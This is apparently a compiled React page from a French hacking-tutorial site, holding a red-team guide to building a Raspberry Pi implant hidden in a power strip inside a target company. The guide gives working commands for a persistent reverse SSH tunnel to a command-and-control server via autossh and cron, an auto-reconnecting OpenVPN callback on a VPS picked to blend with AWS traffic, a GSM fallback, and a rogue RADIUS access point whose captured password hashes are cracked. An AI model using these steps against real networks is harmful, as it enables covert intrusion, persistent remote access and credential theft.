{"ast":null,"code":"import _classCallCheck from\"/mnt/c/Users/Nico/hackingfornoobs_frontend/node_modules/@babel/runtime/helpers/esm/classCallCheck\";import _createClass from\"/mnt/c/Users/Nico/hackingfornoobs_frontend/node_modules/@babel/runtime/helpers/esm/createClass\";import _possibleConstructorReturn from\"/mnt/c/Users/Nico/hackingfornoobs_frontend/node_modules/@babel/runtime/helpers/esm/possibleConstructorReturn\";import _getPrototypeOf from\"/mnt/c/Users/Nico/hackingfornoobs_frontend/node_modules/@babel/runtime/helpers/esm/getPrototypeOf\";import _inherits from\"/mnt/c/Users/Nico/hackingfornoobs_frontend/node_modules/@babel/runtime/helpers/esm/inherits\";import React from'react';import HackThePlanet from\"../img/hacktheplanet.gif\";import Hide from\"../img/hide_raspberry.jpg\";import Methodo from\"../img/methodo.jpg\";import KaliRaspberry from\"../img/kali_raspberry.png\";import Raspap from\"../img/raspap_01.png\";import InstanceVPS from\"../img/instanceVPS.PNG\";import FirewallRules from\"../img/regles_firewall.PNG\";import AutologinProfile from\"../img/autologin_profil.png\";import RedteamUser from\"../img/user_redteam.PNG\";import PublicIP from\"../img/ip_publique.PNG\";import Radius01 from\"../img/radius01.PNG\";import Radius02 from\"../img/radius02.PNG\";var Redteam=/*#__PURE__*/function(_React$Component){_inherits(Redteam,_React$Component);function Redteam(){_classCallCheck(this,Redteam);return _possibleConstructorReturn(this,_getPrototypeOf(Redteam).apply(this,arguments));}_createClass(Redteam,[{key:\"render\",value:function render(){return React.createElement(\"div\",{className:\"article\"},React.createElement(\"h1\",null,\"Redteam\"),React.createElement(\"hr\",null),React.createElement(\"p\",{className:\"tabulation\"},\"Une nouvelle tendance \\xE9merge du c\\xF4t\\xE9 des attaques informatiques, les techniques d\\u2019intrusion se professionnalisent, s\\u2019industrialisent et s\\u2019\\xE9tendent dans le temps. L\\xE0 o\\xF9 des \\xAB amateurs \\xBB n\\u2019avaient qu\\u2019\\xE0 ex\\xE9cuter un script sur un syst\\xE8me vuln\\xE9rable autrefois, des \\xE9quipes exp\\xE9riment\\xE9es peuvent aujourd\\u2019hui passer des mois sur une seule et m\\xEAme cible, \",React.createElement(\"strong\",null,\"APT (Advanced Persitent Threat).\")),React.createElement(\"p\",{className:\"tabulation\"},\"Pour s'adapter les entreprises de s\\xE9curit\\xE9 propose depuis peu une nouvelle approche dans la r\\xE9alisation d\\u2019un test d\\u2019intrusion : le \",React.createElement(\"strong\",null,\"RedTeam\"),\". \",React.createElement(\"br\",null),React.createElement(\"br\",null),\"L\\u2019objectif est de d\\xE9rouler un sc\\xE9nario complet d'attaque depuis l'externe jusqu\\u2019\\xE0 l'interne et la capacit\\xE9 d'effectuer des actions critiques au sein du SI cibl\\xE9. Par rapport \\xE0 un pentest traditionnel la dur\\xE9e est g\\xE9n\\xE9ralement plus longue et les moyens, plus vari\\xE9s (ex: phishing des employ\\xE9s, intrusions physiques dans les locaux).\"),React.createElement(\"img\",{id:\"hacktheplanet\",src:HackThePlanet,alt:\"hack the planet\"}),React.createElement(\"br\",null),React.createElement(\"hr\",null),React.createElement(\"br\",null),React.createElement(\"h2\",null,\"Contexte\"),React.createElement(\"p\",{className:\"tabulation\"},\"Notre projet consiste \\xE0 cr\\xE9er un implant qu'il suffira de d\\xE9poser chez un client pour avoir un acc\\xE8s \\xE0 distance au r\\xE9seau interne. Cela repr\\xE9sente la phase de compromission initiale dans le sch\\xE9ma suivant: \",React.createElement(\"br\",null),React.createElement(\"img\",{id:\"methodoredteam\",src:Methodo,alt:\"m\\xE9thodologie redteam\"}),React.createElement(\"br\",null),\"Le sc\\xE9nario de la mission sera de p\\xE9n\\xE9trer physiquement dans la soci\\xE9t\\xE9 et d'y dissimuler notre backdoor pour obtenir un acc\\xE8s \\xE0 distance via une connexion OpenVPN ou un tunnel SSH invers\\xE9.\",React.createElement(\"br\",null),React.createElement(\"br\",null),\"Des outils tels que la \",React.createElement(\"strong\",null,\"LAN Turtle\"),\" existent d\\xE9j\\xE0 mais l'on souhaite avoir le contr\\xF4le total de nos outils. \",React.createElement(\"br\",null),React.createElement(\"br\",null),\"Plusieurs m\\xE9thodes se doivent d'\\xEAtre impl\\xE9ment\\xE9es au cas o\\xF9 des r\\xE8gles de pare-feu bloqueraient certains flux sortants et une m\\xE9thode alternative de connexion via Wifi ou GSM est \\xE9galement \\xE0 envisager.\"),React.createElement(\"br\",null),React.createElement(\"hr\",null),React.createElement(\"br\",null),React.createElement(\"h2\",null,\"Cahier des charges de la box\"),React.createElement(\"div\",null,\"Plusieurs appareils peuvent convenir, les crit\\xE8res principaux \\xE9tant sa fiabilit\\xE9, sa l\\xE9g\\xE8ret\\xE9, sa taille, sa rapidit\\xE9 et son co\\xFBt:\",React.createElement(\"ul\",null,React.createElement(\"li\",null,\"l'appareil doit \\xEAtre \",React.createElement(\"strong\",null,\"petit\"),\" (facile \\xE0 dissimuler)\"),React.createElement(\"li\",null,\"possibilit\\xE9 d'utiliser un \",React.createElement(\"strong\",null,\"tunnel SSH inverse persistant\"),\" et \",React.createElement(\"strong\",null,\"OpenVPN\")),React.createElement(\"li\",null,\"espace de \",React.createElement(\"strong\",null,\"stockage\"),\" (au moins 32 Go)\"),React.createElement(\"li\",null,\"mat\\xE9riel \",React.createElement(\"strong\",null,\"rapide\")),React.createElement(\"li\",null,React.createElement(\"strong\",null,\"faible co\\xFBt\"),\" (en cas de destruction ou de vol)\"),React.createElement(\"li\",null,\"possibilit\\xE9 d'ajouter des modules \\xE9ventuels\")),\"Il existe de nombreux appareils comme le Hardkernel ODROID-N2 ou encore le Beaglebone Black mais au vu du prix, de la simplicit\\xE9, et des autres crit\\xE8res, on pr\\xE9f\\xE9rera utiliser une \",React.createElement(\"strong\",null,\"Raspberry Pi.\")),React.createElement(\"img\",{id:\"kaliraspberry\",src:KaliRaspberry,alt:\"kali raspberry\"}),React.createElement(\"h2\",null,\"Shopping list pour le mat\\xE9riel\"),React.createElement(\"div\",null,React.createElement(\"ul\",null,React.createElement(\"li\",null,React.createElement(\"a\",{href:\"https://www.canakit.com/raspberry-pi-4-starter-kit.html\"},\"Raspberry Pi 4 Model B with 4GB RAM (Basic Kit) - $100\")),React.createElement(\"li\",null,React.createElement(\"a\",{href:\"https://www.amazon.com/dp/B07FCMBLV6\"},\"SanDisk 64GB Extreme microSDXC UHS-I Memory Card - $15\")),React.createElement(\"li\",null,React.createElement(\"a\",{href:\"https://vilros.com/collections/raspberry-pi-accessories/products/vilros-raspberry-pi-4-compatible-clear-transparent-case-with-built-in-fan\"},\"Raspberry Pi 4 Case with Fan - $10 (optional)\")),React.createElement(\"li\",null,React.createElement(\"a\",{href:\"https://www.amazon.com/gp/product/B01KWQAQ00/ref=ppx_yo_dt_b_asin_title_o00_s00?ie=UTF8&psc=1\"},\"Wireless WiFi USB Dongle Stick Adapter RT5370 150Mbps - $9 (optional)\")))),React.createElement(\"br\",null),React.createElement(\"h2\",null,\"Syst\\xE8me d'exploitation\"),React.createElement(\"p\",{className:\"tabulation\"},\"On retiendra la distribution \",React.createElement(\"strong\",null,\"Kali Linux\"),\" car elle dispose d\\xE9j\\xE0 d'outils de pentest int\\xE9gr\\xE9s, pas besoin d'installation et c'est simple \\xE0 utiliser pour tous pentesters.\"),React.createElement(\"br\",null),React.createElement(\"h2\",null,\"Wifi\"),React.createElement(\"p\",{className:\"tabulation\"},\"La Raspberry Pi 4 dispose d\\xE9j\\xE0 d'une carte sans fil int\\xE9gr\\xE9e (sans fil 2,4 GHz et 5,0 GHz IEEE 802.11ac), et g\\xE8re l'\",React.createElement(\"strong\",null,\"injection de paquets\"),\" et \",React.createElement(\"strong\",null,\"le mode moniteur\"),\" (contrairement \\xE0 la Pi 3). Un autre adaptateur sans fil permettrait d'avoir une meilleure port\\xE9e lors d'attaques sans fil. Un adaptateur sans fil dot\\xE9 d'un \",React.createElement(\"strong\",null,\"chipset RT5370\"),\" serait un bon choix, en plus de prendre en charge le mode moniteur, et l'injection de paquets avec des outils comme \",React.createElement(\"strong\",null,\"Aireplay-ng\"),\", il a une large bande de fr\\xE9quences utilisables. Ainsi on peut se connecter \\xE0 un adaptateur via \",React.createElement(\"strong\",null,\"hostapd\"),\"et utiliser l'autre adaptateur afin de r\\xE9aliser les attaques.\"),React.createElement(\"br\",null),React.createElement(\"h2\",null,\"Comment dissimuler la Raspberry ?\"),React.createElement(\"p\",null,\"Une m\\xE9thode efficace est de la cacher \\xE0 l'int\\xE9rieur d'une multiprise comme suit :\"),React.createElement(\"img\",{id:\"hide_raspberry\",src:Hide,alt:\"id\\xE9e pour chacher raspberry\"}),React.createElement(\"p\",null,\"Cet objet du quotidien dans une entreprise a l'avantage de fournir l'alimentation et le c\\xE2ble r\\xE9seau \\xE0 la carte sans \\xE9veiller trop de soup\\xE7ons de la part des employ\\xE9s\"),React.createElement(\"br\",null),React.createElement(\"hr\",null),React.createElement(\"br\",null),React.createElement(\"h2\",null,\"Configuration initiale\"),React.createElement(\"div\",null,React.createElement(\"ol\",null,React.createElement(\"li\",null,\"Installer l'image Kali pour la carte MicroSD\"),React.createElement(\"li\",null,\"Configurer un point d'acc\\xE8s WiFi\"),React.createElement(\"li\",null,\"Configurer un tunnel SSH inverse automatique\"),React.createElement(\"li\",null,\"Configurer le client et le serveur OpenVPN\"))),React.createElement(\"h3\",null,\"Installation de Kali Linux\"),React.createElement(\"a\",{href:\"https://www.offensive-security.com/kali-linux-arm-images/#1493408272250-e17e9049-9ce8\"},\"Kali Linux\"),React.createElement(\"br\",null),React.createElement(\"br\",null),React.createElement(\"div\",null,React.createElement(\"h4\",null,\"Pour Windows\"),\"Connectez la carte MicroSD \\xE0 la machine Windows. \",React.createElement(\"br\",null),\"D\\xE9compressez l'archive.\",React.createElement(\"br\",null),\"Utilisez Win32DiskImager ou Rufus pour \\xE9crire l'image disque Kali sur la carte MicroSD.\",React.createElement(\"br\",null),React.createElement(\"br\",null),React.createElement(\"h4\",null,\"Pour Linux\"),\"Connectez la carte MicroSD au syst\\xE8me Linux.\",React.createElement(\"br\",null),\"Utilisez la commande \",React.createElement(\"strong\",null,\"dd\"),\" pour cr\\xE9er l'image du fichier Kali sur la carte MicroSD.\",React.createElement(\"br\",null),React.createElement(\"br\",null),React.createElement(\"h4\",null,\"Installation\"),\"Alimentez la Raspberry, connectez clavier/souris/\\xE9cran et connectez-vous \\xE0 Kali Linux avec le nom d'utilisateur \\\"root\\\" et le mot de passe \\\"toor\\\".\",React.createElement(\"br\",null),\"Veillez \\xE0 connecter un c\\xE2ble Ethernet sur la Raspberry pour l'acc\\xE8s internet elle devrait alors r\\xE9cup\\xE9rer automatiquement une adresse IP via DHCP.\"),React.createElement(\"br\",null),React.createElement(\"hr\",null),React.createElement(\"br\",null),React.createElement(\"h3\",null,\"Configurer un point d'acc\\xE8s Wifi\"),React.createElement(\"p\",null,\"On va utiliser l'outil \",React.createElement(\"strong\",null,\"raspAP\"),\" pour mettre en place un point d'acc\\xE8s Wifi sur notre Raspberry :\"),React.createElement(\"div\",{id:\"terminal\"},\"yes | curl -sL https://install.raspap.com | bash\"),React.createElement(\"p\",null,\"Apr\\xE8s le reboot, raspAP a mis en place toute la configuration de l'Access Point (AP) !\",React.createElement(\"br\",null),React.createElement(\"br\",null),\"Le \",React.createElement(\"strong\",null,\"DHCP\"),\" distribue des adresses entre 10.3.141.50 et 10.3.141.255. Ainsi lorsqu\\u2019un appareil (PC, smartphone, tablette...) se connectera sur ce Wifi, une adresse IP comprise entre ces deux valeurs lui sera fournie.\",React.createElement(\"br\",null),React.createElement(\"br\",null),\"On acc\\xE8de \\xE0 l\\u2019interface d\\u2019administration via une page web, en se connectant sur l\\u2019adresse IP : 10.3.141.1. On peut le faire en local sur la Raspberry Pi/AP ou depuis une autre machine connect\\xE9e \\xE0 l\\u2019AP.\",React.createElement(\"br\",null),React.createElement(\"br\",null),\"Les param\\xE8tres par d\\xE9faut sont :\"),React.createElement(\"ul\",null,React.createElement(\"li\",null,\"Adresse IP : 10.3.141.1/24  et  169.254.218.244/16\"),React.createElement(\"li\",null,\"Nom d\\u2019utilisateur : admin\"),React.createElement(\"li\",null,\"Mot de passe : secret\"),React.createElement(\"li\",null,\"Plage DHCP : 10.3.141.50-255\"),React.createElement(\"li\",null,\"SSID : raspi-webgui\"),React.createElement(\"li\",null,\"Mot de passe du SSID : ChangeMe\")),React.createElement(\"img\",{id:\"raspap\",src:Raspap,alt:\"raspap_AP\"}),React.createElement(\"br\",null),React.createElement(\"hr\",null),React.createElement(\"br\",null),React.createElement(\"h3\",null,\"Configurer un reverse shell automatique\"),React.createElement(\"p\",null,\"Pour cette partie on doit disposer d'un serveur de commande et de contr\\xF4le (C\",\"&\",\"C) accessible sur Internet avec SSH d'activ\\xE9. Pour le POC j'ai pour le moment utilis\\xE9 mon serveur perso ^^ \",React.createElement(\"br\",null),React.createElement(\"strong\",null,\"[Sur la Raspberry]\")),React.createElement(\"div\",{id:\"terminal\"},\"apt install autossh \",React.createElement(\"br\",null),\"ssh-keygen (laisser les param\\xE8tres par d\\xE9faut)\"),React.createElement(\"div\",{id:\"terminal\"},\"scp /root/.ssh/id_rsa.pub root@[Server IP_Address]:~/.ssh/\"),React.createElement(\"strong\",null,\"[Sur le serveur]\"),React.createElement(\"br\",null),\"Ajouter le contenu id_rsa.pub \\xE0 ~/.ssh/authorized_keys ou bien cr\\xE9er ce fichier:\",React.createElement(\"br\",null),React.createElement(\"div\",{id:\"terminal\"},\"cat id_rsa.pub >> ~/.ssh/authorized_keys\"),React.createElement(\"p\",null,React.createElement(\"strong\",null,\"[Sur la Raspberry]\"),React.createElement(\"br\",null),\"On va cr\\xE9er une crontab qui ex\\xE9cute autossh apr\\xE8s chaque boot et est relanc\\xE9e toutes les 5 min (en cas de coupure de connexion)\"),React.createElement(\"div\",{id:\"terminal\"},\"vim /bin/autossh-connect.sh\",React.createElement(\"br\",null),\"#!/bin/bash\",React.createElement(\"br\",null),\"autossh -M 11166 -N -f -o \\u201CPubkeyAuthentication=yes\\u201D -o \\u201CPasswordAuthentication=no\\u201D \",React.createElement(\"br\",null),\"-i /root/.ssh/id_rsa -R 6667:localhost:22 root@[Server IP] \",\"&\"),\"-N: n'ex\\xE9cute pas de cmd sur la machine interm\\xE9diaire\",React.createElement(\"br\",null),\"-f: lanc\\xE9 en tache de fond\",React.createElement(\"br\",null),React.createElement(\"br\",null),React.createElement(\"div\",{id:\"terminal\"},\"chmod u+rwx,g+xr,o+x autossh-connect.sh\"),React.createElement(\"div\",{id:\"terminal\"},\"crontab -e\",React.createElement(\"br\",null),\"#Ajouter \\xE0 la fin du fichier : \",React.createElement(\"br\",null),\"@reboot sleep 5 \",\"&&\",\" /bin/autossh-connect.sh > /dev/null 2>\",\"&\",\"1\",React.createElement(\"br\",null),\"*/5 * * * * /bin/autossh-connect.sh > /dev/null 2>\",\"&\",\"1\",React.createElement(\"br\",null)),React.createElement(\"p\",null,\"Voil\\xE0, \\xE0 pr\\xE9sent la RaspBerry va se connecter \\xE0 chaque boot \\xE0 notre serveur de commande et contr\\xF4le\"),React.createElement(\"p\",null,\"Ex\\xE9cutez la commande suivante sur le serveur pour obtenir le reverse shell :\"),React.createElement(\"div\",{id:\"terminal\"},\"ssh root@localhost -p 6667 (credentials par d\\xE9faut de Kali)\"),React.createElement(\"br\",null),React.createElement(\"hr\",null),React.createElement(\"br\",null),React.createElement(\"h3\",null,\"Configurer une connexion OpenVPN\"),React.createElement(\"p\",{className:\"tabulation\"},\"Une garantie d'acc\\xE8s en plus du reverse SSH serait d'utiliser une connexion OpenVPN sur le port 443 (HTTPS). La Raspberry devra d'abord sortir par le port 443 vers un serveur OpenVPN Access Server en notre possession et il suffira de se connecter depuis la machine d'attaque au serveur VPN.\"),React.createElement(\"u\",null,\"Cela se fait en 3 \\xE9tapes :\"),React.createElement(\"ul\",null,React.createElement(\"li\",null,\"Configuration d'OpenVPN Access Server sur le net\"),React.createElement(\"li\",null,\"Configuration de la Raspberry\"),React.createElement(\"li\",null,\"Configuration de la machine d'attaque\")),React.createElement(\"br\",null),React.createElement(\"h3\",null,\"Mise en place OpenVPN Access Server\"),React.createElement(\"p\",{className:\"tabulation\"},\"Pour la solution d'h\\xE9bergement du serveur VPN on peut opter pour un serveur VPS car ils sont faciles et rapides \\xE0 mettre en place.\",React.createElement(\"br\",null),React.createElement(\"br\",null),React.createElement(\"strong\",null,\"Vultr.com\"),\" et \",React.createElement(\"strong\",null,\"Amazon Lightsail\"),\" sont deux fournisseurs de VPS bon march\\xE9 et simples \\xE0 configurer. L'autre raison de ce choix est que le r\\xE9seau de la victime aura souvent beaucoup de trafic vers les serveurs AWS, cela permet donc d'\\xEAtre plus discret dans le r\\xE9seau. Pour le POC je me suis cr\\xE9e un VPS perso sur Amazon.\"),React.createElement(\"ol\",null,React.createElement(\"li\",null,\"Allez sur \",React.createElement(\"a\",{href:\"https://aws.amazon.com/lightsail/\"},\"Lien VPS amazon\"),\", se connecter puis cr\\xE9er une nouvelle instance de VPS (OS Ubuntu)\"),React.createElement(\"img\",{id:\"instance\",src:InstanceVPS,alt:\"instance VPS\"}),\"Une fois cr\\xE9e, Manage -> Networking, ajoutez 2 r\\xE8gles firewall sur les ports (443 et 943)\",React.createElement(\"img\",{id:\"firewall\",src:FirewallRules,alt:\"r\\xE8gle firewall\"}),React.createElement(\"li\",null,\"Installez OpenVPN AS\"),React.createElement(\"p\",{id:\"terminal\",style:{'text-align':'left'}},\"# apt update \",\"&&\",\" apt -y install ca-certificates wget net-tools \",React.createElement(\"br\",null),\"# wget -qO - https://as-repository.openvpn.net/as-repo-public.gpg | apt-key add - \",React.createElement(\"br\",null),\"# echo \\\"deb http://as-repository.openvpn.net/as/debian bionic main\\\" > /etc/apt/sources.list.d/openvpn-as-repo.list \",React.createElement(\"br\",null),\"# apt update \",\"&&\",\" apt -y install openvpn-as \",React.createElement(\"br\",null)),React.createElement(\"li\",null,\"Supprimez le profil actuel et configurez OpenVPN:  \",React.createElement(\"strong\",null,\"/usr/local/openvpn_as/bin/ovpn-init\")),React.createElement(\"li\",null,\"Tapez DELETE: (sensible \\xE0 la casse)\"),React.createElement(\"li\",null,\"Finir l'installation comme suit :\")),React.createElement(\"p\",{id:\"terminal\"},\"Accept EULA: yes \",React.createElement(\"br\",null),\"Will this be the primary Access Server node: yes \",React.createElement(\"br\",null),\"Please specify the network interface and IP address to be \",React.createElement(\"br\",null),\"used by the Admin Web UI: \",React.createElement(\"br\",null),\"(1) all interfaces: 0.0.0.0 \",React.createElement(\"br\",null),\"(2) eth0: 45.77.217.54 \",React.createElement(\"br\",null),\"R\\xE9ponse: 1 \",React.createElement(\"br\",null),\"Please specify the port number for the Admin Web UI. \",React.createElement(\"br\",null),\"R\\xE9ponse: 943 \",React.createElement(\"br\",null),\"Please specify the TCP port number for the OpenVPN Daemon \",React.createElement(\"br\",null),\"R\\xE9ponse: 443 \",React.createElement(\"br\",null),\"Should client traffic be routed by default through the VPN? \",React.createElement(\"br\",null),\"R\\xE9ponse: YES \",React.createElement(\"br\",null),\"Should client DNS traffic be routed by default through the VPN? \",React.createElement(\"br\",null),\"R\\xE9ponse: YES \",React.createElement(\"br\",null),\"Use local authentication via internal DB? \",React.createElement(\"br\",null),\"Pour la suite s\\xE9lectionnez les r\\xE9ponses par d\\xE9faut (tapez juste 'Enter') \",React.createElement(\"br\",null)),React.createElement(\"p\",null,\"passwd openvpn \",React.createElement(\"br\",null),\"Changez le mot de passe pour l'utilisateur openvpn.\"),React.createElement(\"br\",null),React.createElement(\"h3\",null,\"Configuration de OpenVPN AS Server\"),React.createElement(\"ol\",null,React.createElement(\"li\",null,\"Allez sur https://[IP_Serveur_VPS]:943/admin/\"),React.createElement(\"li\",null,\"Se connecter avec le compte \",React.createElement(\"strong\",null,\"openvpn\"),\" et le mot de passe pr\\xE9c\\xE9demment cr\\xE9e.\"),React.createElement(\"li\",null,\"Authentication -> General -> Set to Local (ON) -> Save Settings -> Update Server\"),React.createElement(\"li\",null,\"User Management -> User Permissions, cr\\xE9ez l'utilisateur \",React.createElement(\"strong\",null,\"redteam\"),\" avec \",React.createElement(\"strong\",null,\"Set AllowAuto-login\")),React.createElement(\"li\",null,\"-> More settings, activez les autorisations : \",React.createElement(\"br\",null),React.createElement(\"strong\",null,\"All server-side private subnets\"),React.createElement(\"br\",null),React.createElement(\"strong\",null,\"All other VPN clients\")),React.createElement(\"li\",null,\"-> Network settings, indiquer l'adresse publique du VPS\")),React.createElement(\"img\",{id:\"publique\",src:PublicIP,alt:\"modification ip publique\"}),React.createElement(\"h3\",null,\"T\\xE9l\\xE9charger les profils OpenVPN\"),React.createElement(\"ol\",null,React.createElement(\"li\",null,\"Se connecter sur https://[IP_VPS]:943/?src=connect\"),React.createElement(\"li\",null,\"Pour chaque utilisateur se connecter et t\\xE9l\\xE9charger le profil \",React.createElement(\"strong\",null,\"Yourself (autologin profile)\"))),React.createElement(\"img\",{id:\"autologin\",src:AutologinProfile,alt:\"autologin profile\"}),React.createElement(\"h3\",null,\"Configuration de la Raspberry Pi\"),React.createElement(\"li\",null,\"Allumez la Raspberry et branchez un c\\xE2ble ethernet\"),React.createElement(\"li\",null,\"Configurez le d\\xE9marrage automatique d'OpenVPN : \",React.createElement(\"strong\",null,\"vim /etc/default/openvpn\"),\" \",React.createElement(\"br\",null),\" et d\\xE9commentez \",React.createElement(\"strong\",null,\"[\\u2018AUTOSTART=\\u201Dall\\u201D\\u2019]\")),React.createElement(\"li\",null,\"Copiez \",React.createElement(\"strong\",null,\"client.ovpn\"),\" sur la Raspberry dans \",React.createElement(\"strong\",null,\"/etc/openvpn/\")),React.createElement(\"li\",null,\"Renommez le en \",React.createElement(\"strong\",null,\"client.conf\")),React.createElement(\"li\",null,\"Activez OpenVPN pour d\\xE9marrer au boot: \",React.createElement(\"strong\",null,\"update-rc.d openvpn enable\")),React.createElement(\"li\",null,\"Reboot\"),React.createElement(\"br\",null),React.createElement(\"p\",{className:\"tabulation\"},\"Sur OpenVPN AS, Connexions -> Utilisateurs actuels, on voit appara\\xEEtre l'utilisateur \",React.createElement(\"strong\",null,\"redteam\"),\" avec l'adresse r\\xE9elle de l'endroit o\\xF9 la Raspberry est branch\\xE9e et une adresse VPN.\"),React.createElement(\"img\",{id:\"redteamuser\",src:RedteamUser,alt:\"connexion utilisateur redteam\"}),React.createElement(\"p\",{className:\"tabulation\"},\" Nous avons \\xE0 pr\\xE9sent la Raspberry configur\\xE9e pour se reconnecter au serveur OpenVPN de notre serveur VPS d\\xE8s qu'elle est connect\\xE9e \\xE0 un r\\xE9seau.\"),React.createElement(\"img\",{src:\"https://media.giphy.com/media/x2z9nswqAfpp6/giphy.gif\",alt:\"yatta\"}),React.createElement(\"p\",null,\"Pour avoir un acc\\xE8s \\xE0 la Raspberry il suffit d'utiliser le m\\xEAme profil vpn \\xE0 partir de notre VM d'attaque et d'utiliser ssh sur l'adresse IP priv\\xE9e du dessus :\"),React.createElement(\"div\",{id:\"terminal\"},\"# openvpn --config ./client.ovpn \",React.createElement(\"br\",null),\"# ssh root@172.27.224.2\"),React.createElement(\"br\",null),React.createElement(\"hr\",null),React.createElement(\"br\",null),React.createElement(\"h3\",null,\"Configuration GSM\"),React.createElement(\"p\",null,\"Lien pour dongle : \",React.createElement(\"a\",{href:\"http://shop.mchobby.be/product.php?id_product=677\"},\"dongle GSM (23,60\\u20AC)\"),\"    (module 3G HSDPA, support SMS et connexion internet)\"),React.createElement(\"p\",{className:\"tabulation\"},\"Ce module permet d'\\xE9tablir des connexions Internet via le r\\xE9seau 3G et d'obtenir une connexion l\\xE0 o\\xF9 vous ne disposez pas d'ADSL, de ligne t\\xE9l\\xE9phonique classique ou de WiFi.\"),React.createElement(\"ul\",null,React.createElement(\"li\",null,\"Editez le fichier \",React.createElement(\"strong\",null,\"config.txt\"),\" dans le dossier \",React.createElement(\"strong\",null,\"/boot/\")),React.createElement(\"li\",null,\"Ajoutez la ligne suivante: \",React.createElement(\"strong\",null,\"max_usb_current=1\")),React.createElement(\"li\",null,\"Apr\\xE8s reboot, branchez la clef USB \\xE0 la Raspberry\")),React.createElement(\"p\",null,\"La commande \",React.createElement(\"strong\",null,\"lsusb\"),\" devrait la faire appara\\xEEtre dans la liste. Sinon v\\xE9rifiez le mat\\xE9riel et la connectique.\"),React.createElement(\"div\",{id:\"terminal\"},\"$ sudo apt-get update\",React.createElement(\"br\",null),\"$ sudo apt-get install ppp wvdial\",React.createElement(\"br\",null)),React.createElement(\"h4\",null,\"Configuration de wvdial\"),React.createElement(\"p\",null,\"Le fichier de configuration \",React.createElement(\"strong\",null,\"/etc/wvdial.conf\"),\" :\"),React.createElement(\"div\",{id:\"terminal\"},\"[Dialer Defaults]\",React.createElement(\"br\",null),\"Init1 = ATZ\",React.createElement(\"br\",null),\"Init2 = ATQ0 V1 E1 S0=0 \",\"&\",\"C1 \",\"&\",\"D2\",React.createElement(\"br\",null),\"Init3 = AT+CGDCONT=1,\\\"IP\\\",\\\"web.be\\\"\",React.createElement(\"br\",null),\"Stupid Mode = 1\",React.createElement(\"br\",null),\"Modem Type = Analog Modem\",React.createElement(\"br\",null),\"ISDN = 0\",React.createElement(\"br\",null),\"New PPPD = yes\",React.createElement(\"br\",null),\"Phone = *99#\",React.createElement(\"br\",null),\"Modem = /dev/ttyUSB0\",React.createElement(\"br\",null),\"Username = web\",React.createElement(\"br\",null),\"Password = web\",React.createElement(\"br\",null),\"Baud = 9600\"),React.createElement(\"p\",null,\"Les param\\xE8tres \",React.createElement(\"strong\",null,\"web.be\"),\" sont des param\\xE8tres propres aux op\\xE9rateurs 3G :\",React.createElement(\"br\",null),React.createElement(\"br\",null),React.createElement(\"strong\",null,\"Pour Mobistar (Orange Belgique)\"),React.createElement(\"br\",null),\"Remplacez web.be par \",React.createElement(\"strong\",null,\"mworld.be\"),\", (business: entrez web.pro.be)\",React.createElement(\"br\",null),\"' Username = '' et ' Password = ''\",React.createElement(\"br\",null),React.createElement(\"br\",null),React.createElement(\"strong\",null,\"Pour Proximus\"),React.createElement(\"br\",null),\"Remplacez web.be par \",React.createElement(\"strong\",null,\"internet.proximus.be\"),React.createElement(\"br\",null),\"' Username = '' et ' Password = ''\",React.createElement(\"br\",null),React.createElement(\"br\",null),React.createElement(\"strong\",null,\"Pour Base\"),React.createElement(\"br\",null),\"Remplacez web.be par \",React.createElement(\"strong\",null,\"gprs.base.be\"),React.createElement(\"br\",null),\"' Username = 'base' et ' Password = 'base'\"),React.createElement(\"p\",{className:\"tabulation\"},\"Une fois wvdial configur\\xE9, \",React.createElement(\"strong\",null,\"sudo wvdial\"),\" afin de lancer la connexion 3G. Plusieurs informations vont d\\xE9filer \\xE0 l'\\xE9cran dont l'adresse IP publique et les DNS fournis par le FAI. CTRL+C pour couper la connexion, cela affichera alors la dur\\xE9e pendant laquelle la connexion a \\xE9t\\xE9 maintenue.\"),React.createElement(\"br\",null),React.createElement(\"hr\",null),React.createElement(\"br\",null),React.createElement(\"h3\",null,\"Contournement authentifiaction radius\"),React.createElement(\"p\",{className:\"tabulation\"},\"Dans les entreprises le WiFi est souvent configur\\xE9 en \",React.createElement(\"strong\",null,\"WPA2-PEAP MSCHAPv2\"),\", gr\\xE2ce \\xE0 sa facilit\\xE9 d\\u2019installation dans une infrastructure Windows. La connexion au r\\xE9seau WiFi se fait alors par une authentification \\xE0 un \",React.createElement(\"strong\",null,\"serveur Radius\"),\" qui permet aux utilisateurs de l\\u2019entreprise de se connecter avec leur compte de domaine.\"),React.createElement(\"p\",{className:\"tabulation\"},\"Mais cette configuration est vuln\\xE9rable \\xE0 une attaque \",React.createElement(\"strong\",null,\"MITM\"),\" (Man In The Middle) qui permet de r\\xE9cup\\xE9rer les hashs des mots de passe des utilisateurs. \",React.createElement(\"br\",null),React.createElement(\"br\",null),\"Cela consiste \\xE0 cr\\xE9er un faux serveur Radius qui intercepte les demandes d\\u2019authentification \\xE0 la place du vrai point d\\u2019acc\\xE8s, \\xE0 condition que le serveur de l\\u2019attaquant offre un signal plus fort que le vrai point d\\u2019acc\\xE8s.\"),React.createElement(\"u\",null,\"La m\\xE9thodologie \\xE0 suivre :\"),React.createElement(\"ul\",null,React.createElement(\"li\",null,\"Mettre en place un faux serveur Radius \\xE0 l\\u2019aide de \",React.createElement(\"strong\",null,\"hostapd-wpe\"),\" configur\\xE9 avec le m\\xEAme SSID que la cible (ici \\xAB Wing Secure \\xBB) puis attendre la tentative de connexion d\\u2019un utilisateur.\"),React.createElement(\"img\",{id:\"radius01\",src:Radius01,alt:\"radius01\"}),React.createElement(\"li\",null,\"Bruteforcer le mot de passe avec \",React.createElement(\"strong\",null,\"John\"),\", \",React.createElement(\"strong\",null,\"hashcat\"),\" ou avec une attaque par dictionnaire avec \",React.createElement(\"strong\",null,\"asleap\"),\".\"),React.createElement(\"img\",{id:\"radius02\",src:Radius02,alt:\"radius02\"})),React.createElement(\"p\",null,\"On retrouve bien le mot de passe \\\"\",React.createElement(\"strong\",null,\"testtest123\"),\"\\\" en quelques secondes avec une wordlist.\"));}}]);return Redteam;}(React.Component);export default 